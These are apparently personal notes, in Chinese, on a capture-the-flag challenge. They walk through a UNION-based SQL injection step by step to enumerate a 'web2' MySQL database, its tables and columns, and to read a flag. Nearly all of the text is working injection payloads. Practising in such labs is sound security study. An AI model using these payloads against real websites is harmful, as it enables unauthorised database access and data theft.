#SQL注入 
#### 1.查当前数据库名称
```
' or 1=1 union select 1,database(),3#
``` 
![[Pasted image 20230116153026.png]]
得到数据库名称web2
#### 2.查看数据库表
```
' or 1=1 union select 1,(select count(*) from information_schema.tables where table_schema = 'web2'),3#
```
![[Pasted image 20230116153435.png]]
表名
```
' or 1=1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='web2'#
```
![[Pasted image 20230116153501.png]]
#### 3.查看表的列
```
' or 1=1 union select 1, group_concat(column_name),3 from information_schema.columns where table_name='flag'#
```
![[Pasted image 20230116153711.png]]
#### 4.查看flag
```
' or 1=1 union select 1,flag,3 from flag#
```
![[Pasted image 20230116153810.png]]
